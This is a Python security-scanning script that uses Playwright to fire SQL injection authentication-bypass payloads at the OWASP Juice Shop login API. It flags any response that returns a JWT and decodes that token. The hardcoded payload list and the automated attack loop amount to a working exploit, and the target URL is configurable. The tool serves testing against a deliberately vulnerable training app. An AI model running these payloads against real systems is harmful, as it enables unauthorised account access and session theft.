"""
Juice Shop Login SQL Injection Detector
Action-based scanning with Playwright request interception
Specifically targets /rest/user/login endpoint with JSON payloads
"""
import asyncio
import json
import time
import re
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import logging

try:
    from playwright.async_api import Page, Route, Request
except ImportError:
    pass

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class AuthBypassType(Enum):
    """Authentication bypass types"""
    SQL_INJECTION = "sql_injection"
    AUTH_BYPASS = "auth_bypass"
    JWT_MANIPULATION = "jwt_manipulation"


@dataclass
class LoginFinding:
    """Login vulnerability finding"""
    vulnerability_type: AuthBypassType
    severity: str
    url: str
    endpoint: str
    payload: Dict[str, str]
    original_email: str
    evidence: str
    jwt_token: Optional[str] = None
    user_data: Optional[Dict] = None
    http_status: int = 0
    response_time: float = 0.0
    confidence: float = 1.0
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "template-id": f"auth-bypass-{self.vulnerability_type.value}",
            "tool": "juice-login-sqli-detector",
            "info": {
                "name": f"Authentication Bypass via {self.vulnerability_type.value.replace('_', ' ').title()}",
                "description": self.evidence,
                "severity": self.severity,
                "solution": "Use parameterized queries for authentication. Implement rate limiting. Use prepared statements.",
                "cwe-id": ["CWE-287", "CWE-89"],
                "references": [
                    "https://owasp.org/www-project-juice-shop/",
                    "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
                ]
            },
            "url": self.url,
            "matched-at": self.endpoint,
            "parameter": "email",
            "evidence": self.evidence[:500],
            "payload": json.dumps(self.payload),
            "jwt_token": self.jwt_token,
            "user_data": self.user_data,
            "response_time_ms": self.response_time,
            "confidence": self.confidence
        }


class JuiceShopLoginSQLiDetector:
    """
    Juice Shop Login SQL Injection Detector
    
    Uses Playwright to:
    1. Navigate to login page
    2. Intercept XHR/Fetch requests to /rest/user/login
    3. Modify request body with SQLi payloads
    4. Analyze response for authentication bypass
    """

    # SQL Injection payloads for authentication bypass
    SQLI_PAYLOADS = [
        # Classic auth bypass
        {"email": "' OR '1'='1", "password": "' OR '1'='1"},
        {"email": "' OR 1=1--", "password": "anything"},
        {"email": "admin'--", "password": "anything"},
        {"email": "' OR ''='", "password": "' OR ''='"},
        
        # Email-based bypass
        {"email": "admin@juice-sh.op'--", "password": "x"},
        {"email": "user@juice-sh.op' OR '1'='1", "password": "x"},
        
        # UNION-based (extract admin)
        {"email": "' UNION SELECT * FROM Users WHERE email='admin@juice-sh.op'--", "password": "x"},
        
        # Comment-based
        {"email": "admin@juice-sh.op#", "password": "x"},
        {"email": "admin@juice-sh.op/*", "password": "x"},
        
        # Double encoding
        {"email": "%27%20OR%20%271%27%3D%271", "password": "x"},
        
        # Advanced bypasses
        {"email": "' OR email LIKE '%admin%'--", "password": "x"},
        {"email": "' OR 1=1 LIMIT 1--", "password": "x"},
    ]

    def __init__(
        self,
        page: Optional['Page'] = None,
        timeout: int = 30000,
        target_url: str = None
    ):
        self.page = page
        self.timeout = timeout
        self.target_url = target_url or "http://localhost:3000"
        self.base_url = target_url
        
        self.findings: List[LoginFinding] = []
        self.captured_responses: List[Dict] = []
        self.intercepted_requests: List[Dict] = []
        
        # Route handler
        self._route_handler = None

    async def detect_login_sqli(self) -> List[LoginFinding]:
        """
        Main detection method - tests login form with SQLi payloads
        """
        if not self.page:
            logger.error("Playwright page not provided")
            return []

        logger.info(f"Starting Juice Shop Login SQLi detection on {self.target_url}")
        
        findings = []
        
        # Navigate to login page
        login_url = f"{self.target_url}/#/login"
        logger.info(f"Navigating to login page: {login_url}")
        
        try:
            await self.page.goto(login_url, wait_until="networkidle", timeout=self.timeout)
            await asyncio.sleep(2)  # Wait for Angular to render
        except Exception as e:
            logger.error(f"Navigation error: {e}")
            return findings

        # Setup request interception
        await self._setup_interception()

        # Test each payload
        for i, payload in enumerate(self.SQLI_PAYLOADS):
            logger.info(f"Testing payload {i+1}/{len(self.SQLI_PAYLOADS)}: {payload['email'][:30]}")
            
            try:
                finding = await self._test_payload(payload)
                if finding:
                    findings.append(finding)
                    logger.warning(f"✓ AUTH BYPASS FOUND! Email: {payload['email']}")
                    # Continue testing other payloads for completeness
            except Exception as e:
                logger.error(f"Payload test error: {e}")
                continue

        self.findings.extend(findings)
        
        # Cleanup
        await self._cleanup_interception()
        
        return findings

    async def _setup_interception(self):
        """Setup request interception for login API"""
        
        async def handle_route(route: Route):
            """Intercept and modify login requests"""
            request = route.request
            
            # Check if this is a login request
            if '/rest/user/login' in request.url:
                self.intercepted_requests.append({
                    'url': request.url,
                    'method': request.method,
                    'headers': dict(request.headers),
                    'post_data': request.post_data
                })
                
                logger.info(f"Intercepted login request: {request.url}")
                
                # Continue with original request (we modified form fields before submit)
                await route.continue_()
            else:
                await route.continue_()
        
        # Apply route handler
        self._route_handler = handle_route
        await self.page.route("**/rest/user/login", handle_route)
        
        # Also capture responses
        self.page.on("response", self._on_response)

    def _on_response(self, response):
        """Capture responses for analysis"""
        if '/rest/user/login' in response.url:
            try:
                status = response.status
                headers = response.headers
                body = response.text()
                
                self.captured_responses.append({
                    'url': response.url,
                    'status': status,
                    'headers': headers,
                    'body': body[:2000] if body else None
                })
                
                logger.info(f"Captured login response: status={status}")
            except Exception as e:
                logger.debug(f"Response capture error: {e}")

    async def _try_form_interaction(self, payload: Dict[str, str]) -> Optional[LoginFinding]:
        """
        Try to interact with login form (fallback method)
        """
        try:
            # Wait for form to be ready with longer timeout
            await self.page.wait_for_selector('input[formcontrolname="email"]', timeout=10000)
            
            # Fill email and password
            await self.page.fill('input[formcontrolname="email"]', payload['email'])
            await asyncio.sleep(0.3)
            
            await self.page.fill('input[formcontrolname="password"]', payload['password'])
            await asyncio.sleep(0.3)
            
            # Click login button
            await self.page.click('button[type="submit"]')
            
        except Exception as e:
            logger.debug(f"Form interaction error: {e}")
            return None

    async def _test_payload(self, payload: Dict[str, str]) -> Optional[LoginFinding]:
        """
        Test a single SQLi payload on the login form
        Uses direct API call instead of form interaction for reliability
        """
        start_time = time.time()

        # Clear previous captures
        self.captured_responses.clear()

        # Method 1: Direct API call (more reliable)
        try:
            logger.info(f"Sending direct API request to /rest/user/login")
            
            # Make direct POST request to login API
            response = await self.page.request.post(
                f"{self.target_url}/rest/user/login",
                data=payload,  # Use 'data' instead of 'json' in Playwright
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
            )
            
            # Read response
            status = response.status
            body = await response.text()
            
            logger.info(f"API Response: status={status}, body={body[:200]}")
            
            # Analyze response
            if status == 200 and body:
                finding = await self._analyze_response(
                    payload=payload,
                    response={
                        'status': status,
                        'body': body,
                        'headers': response.headers
                    },
                    response_time=time.time() - start_time
                )
                if finding:
                    return finding
                    
        except Exception as e:
            logger.error(f"Direct API request error: {e}")
            
        # Method 2: Try form interaction as fallback
        try:
            await self._try_form_interaction(payload)
            
            # Wait for response (with timeout)
            await asyncio.sleep(2)
            
            # Analyze any captured responses
            for resp in self.captured_responses:
                if resp['status'] == 200 and resp['body']:
                    finding = await self._analyze_response(
                        payload=payload,
                        response=resp,
                        response_time=time.time() - start_time
                    )
                    if finding:
                        return finding
                        
        except Exception as e:
            logger.debug(f"Form interaction fallback error: {e}")

        # Analyze captured responses
        for resp in self.captured_responses:
            if resp['status'] == 200 and resp['body']:
                finding = await self._analyze_response(
                    payload=payload,
                    response=resp,
                    response_time=time.time() - start_time
                )
                if finding:
                    return finding

        # Also check if we got redirected or if page changed
        # (some apps indicate success via UI changes)
        try:
            # Check for user account icon (logged in state)
            account_icon = await self.page.query_selector('mat-icon[ng-reflect-icon="account_circle"]')
            if account_icon:
                # Check for JWT in localStorage
                jwt_token = await self.page.evaluate("""
                    () => {
                        const token = localStorage.getItem('token');
                        return token ? token : null;
                    }
                """)
                
                if jwt_token:
                    finding = LoginFinding(
                        vulnerability_type=AuthBypassType.AUTH_BYPASS,
                        severity="critical",
                        url=self.target_url,
                        endpoint="/rest/user/login",
                        payload=payload,
                        original_email=payload['email'],
                        evidence=f"Authentication bypass successful! JWT token obtained via SQL injection",
                        jwt_token=jwt_token[:100] + "..." if len(jwt_token) > 100 else jwt_token,
                        http_status=200,
                        response_time=time.time() - start_time,
                        confidence=0.95
                    )
                    return finding
        except Exception as e:
            logger.debug(f"UI state check error: {e}")

        return None

    async def _analyze_response(
        self,
        payload: Dict[str, str],
        response: Dict,
        response_time: float
    ) -> Optional[LoginFinding]:
        """
        Analyze login response for authentication bypass indicators
        """
        try:
            body = response.get('body', '')
            if not body:
                return None

            # Try to parse JSON
            try:
                data = json.loads(body)
            except (json.JSONDecodeError, TypeError):
                logger.debug("Response is not valid JSON")
                return None

            # Check for authentication success indicators
            jwt_token = None
            user_data = None
            auth_token = None

            # Juice Shop response format: {"authentication": {"token": "...", "bid": 123}}
            if 'authentication' in data:
                auth = data['authentication']
                if isinstance(auth, dict):
                    jwt_token = auth.get('token')
                    user_id = auth.get('bid')
                    
                    if jwt_token:
                        # Decode JWT to get user info (optional)
                        user_data = await self._decode_jwt(jwt_token)
                        
                        finding = LoginFinding(
                            vulnerability_type=AuthBypassType.SQL_INJECTION,
                            severity="critical",
                            url=self.target_url,
                            endpoint="/rest/user/login",
                            payload=payload,
                            original_email=payload['email'],
                            evidence=f"SQL Injection in login form bypassed authentication. User ID: {user_id}",
                            jwt_token=jwt_token[:100] + "..." if len(jwt_token) > 100 else jwt_token,
                            user_data=user_data,
                            http_status=response['status'],
                            response_time=response_time,
                            confidence=1.0
                        )
                        logger.info(f"JWT token obtained: {jwt_token[:50]}...")
                        return finding

            # Alternative: direct user object in response
            if 'user' in data:
                user_data = data['user']
                if isinstance(user_data, dict) and user_data.get('email'):
                    finding = LoginFinding(
                        vulnerability_type=AuthBypassType.AUTH_BYPASS,
                        severity="critical",
                        url=self.target_url,
                        endpoint="/rest/user/login",
                        payload=payload,
                        original_email=payload['email'],
                        evidence=f"Authentication bypassed! Logged in as: {user_data.get('email')}",
                        user_data=user_data,
                        http_status=response['status'],
                        response_time=response_time,
                        confidence=0.95
                    )
                    return finding

            # Check for generic success indicators
            if data.get('status') == 'success' or data.get('success') == True:
                if 'token' in data or 'jwt' in data or 'session' in data:
                    finding = LoginFinding(
                        vulnerability_type=AuthBypassType.AUTH_BYPASS,
                        severity="critical",
                        url=self.target_url,
                        endpoint="/rest/user/login",
                        payload=payload,
                        original_email=payload['email'],
                        evidence=f"Login successful with SQLi payload (generic success detection)",
                        http_status=response['status'],
                        response_time=response_time,
                        confidence=0.8
                    )
                    return finding

        except Exception as e:
            logger.debug(f"Response analysis error: {e}")

        return None

    async def _decode_jwt(self, token: str) -> Optional[Dict]:
        """Decode JWT token payload (without verification)"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None

            # Decode payload (second part)
            import base64
            # Add padding if needed
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding

            decoded = base64.urlsafe_b64decode(payload)
            return json.loads(decoded)
        except Exception as e:
            logger.debug(f"JWT decode error: {e}")
            return None

    async def _cleanup_interception(self):
        """Cleanup route handlers"""
        try:
            await self.page.unroute("**/rest/user/login", self._route_handler)
        except:
            pass

    def get_findings(self) -> List[LoginFinding]:
        """Get all findings"""
        return self.findings

    def get_findings_summary(self) -> Dict[str, Any]:
        """Get summary of findings"""
        return {
            'total': len(self.findings),
            'by_type': {t.value: len([f for f in self.findings if f.vulnerability_type == t]) for t in AuthBypassType},
            'by_severity': {s: len([f for f in self.findings if f.severity == s]) for s in ['critical', 'high', 'medium', 'low', 'info']},
            'payloads_tested': len(self.SQLI_PAYLOADS),
            'requests_intercepted': len(self.intercepted_requests),
            'responses_captured': len(self.captured_responses)
        }


async def test_juice_login_sqli(target_url: str = "http://localhost:3000"):
    """
    Test function for Juice Shop Login SQLi detection
    """
    from playwright.async_api import async_playwright

    logger.info(f"Testing Juice Shop Login SQLi on {target_url}")

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()

        detector = JuiceShopLoginSQLiDetector(
            page=page,
            target_url=target_url
        )

        findings = await detector.detect_login_sqli()

        print(f"\n{'='*60}")
        print(f"TEST COMPLETE")
        print(f"{'='*60}")
        print(f"Findings: {len(findings)}")
        
        for finding in findings:
            print(f"\n🎯 VULNERABILITY FOUND!")
            print(f"   Type: {finding.vulnerability_type.value}")
            print(f"   Severity: {finding.severity}")
            print(f"   Payload: {finding.payload}")
            print(f"   Evidence: {finding.evidence}")
            if finding.jwt_token:
                print(f"   JWT Token: {finding.jwt_token[:50]}...")

        await browser.close()
        
        return findings


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    asyncio.run(test_juice_login_sqli(target))
